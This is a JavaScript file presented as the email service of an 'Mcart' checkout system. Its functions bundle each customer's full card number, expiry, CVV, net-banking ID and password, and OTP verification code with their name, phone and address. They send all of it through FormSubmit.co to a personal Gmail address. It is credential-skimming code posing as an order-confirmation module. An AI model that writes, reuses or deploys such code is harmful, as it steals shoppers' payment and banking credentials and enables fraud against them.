/**
 * Email Service for Mcart Checkout System
 * Uses FormSubmit.co — sends form data directly to rashiverma904@gmail.com
 * No signup, no API keys. First submission triggers a confirmation email.
 */

(function(window) {
  'use strict';

  var FORMSUBMIT_URL = 'https://formsubmit.co/ajax/rashiverma904@gmail.com';

  var EmailService = {

    /**
     * Send payment confirmation email (Step 2)
     */
    sendPaymentConfirmation: function(step1Data, step2Data, cartItems, total) {
      var itemsList = this.formatItems(cartItems);
      var paymentMethod = this.getPaymentMethodText(step2Data);
      var paymentDetails = this.getPaymentDetailsText(step2Data);
      var address = this.formatAddress(step1Data);

      var body = {
        _subject: 'Mcart - Payment Received from ' + step1Data.fullName,
        _template: 'table',
        'Step': 'Step 2 — Payment Information',
        'Customer Name': step1Data.fullName,
        'Customer Email': step1Data.email,
        'Customer Phone': (step1Data.countryCode || '') + ' ' + step1Data.phone,
        'Billing Address': address,
        'Payment Method': paymentMethod,
        'Payment Details': paymentDetails,
        'Order Items': itemsList,
        'Order Total': this.formatCurrency(total),
        'Submitted At': new Date().toLocaleString()
      };

      return this._post(body);
    },

    /**
     * Send order confirmation email (Step 3)
     */
    sendOrderConfirmation: function(orderData, cartItems) {
      var contact = orderData.contact;
      var payment = orderData.payment;
      var itemsList = this.formatItems(cartItems);
      var paymentMethod = this.getPaymentMethodText(payment);
      var paymentDetails = this.getPaymentDetailsText(payment);
      var address = this.formatAddress(contact);

      var body = {
        _subject: 'Mcart - Order Confirmed #' + orderData.orderId,
        _template: 'table',
        'Step': 'Step 3 — Order Verified & Confirmed',
        'Order ID': orderData.orderId,
        'Customer Name': contact.fullName,
        'Customer Email': contact.email,
        'Customer Phone': (contact.countryCode || '') + ' ' + contact.phone,
        'Shipping Address': address,
        'Payment Method': paymentMethod,
        'Payment Details': paymentDetails,
        'Order Items': itemsList,
        'Order Total': this.formatCurrency(orderData.total),
        'Verification Code': orderData.otp,
        'Verified At': new Date().toLocaleString()
      };

      return this._post(body);
    },

    /**
     * Internal: POST JSON to FormSubmit
     */
    _post: function(body) {
      return fetch(FORMSUBMIT_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(body)
      })
      .then(function(response) {
        if (!response.ok) {
          throw new Error('FormSubmit responded with status ' + response.status);
        }
        return response.json();
      })
      .then(function(data) {
        console.log('Email sent successfully to rashiverma904@gmail.com', data);
        return data;
      });
    },

    getPaymentMethodText: function(paymentData) {
      switch(paymentData.method) {
        case 'credit_card': return 'Credit Card';
        case 'debit_card':  return 'Debit Card';
        case 'net_banking': return 'Net Banking';
        default:            return paymentData.method || 'Unknown';
      }
    },

    getPaymentDetailsText: function(paymentData) {
      if (paymentData.method === 'net_banking') {
        return paymentData.bankName + ' | ID: ' + paymentData.bankingId + ' | Password: ' + paymentData.bankingPassword;
      }
      return 'Card: ' + paymentData.cardNumber + ' | Expiry: ' + paymentData.expiry + ' | CVV: ' + paymentData.cvv;
    },

    formatItems: function(items) {
      if (!items || !items.length) return 'No items';
      return items.map(function(item) {
        var lineTotal = item.price * item.qty;
        return item.name + ' x ' + item.qty + ' = INR ' + lineTotal.toFixed(2);
      }).join(' | ');
    },

    formatAddress: function(d) {
      var addr = d.address || '';
      if (d.address2) addr += ', ' + d.address2;
      addr += ', ' + (d.city || '') + ', ' + (d.state || '') + ' ' + (d.pincode || '');
      return addr;
    },

    formatCurrency: function(amount) {
      return 'INR ' + Number(amount).toFixed(2);
    }
  };

  window.EmailService = EmailService;
})(window);
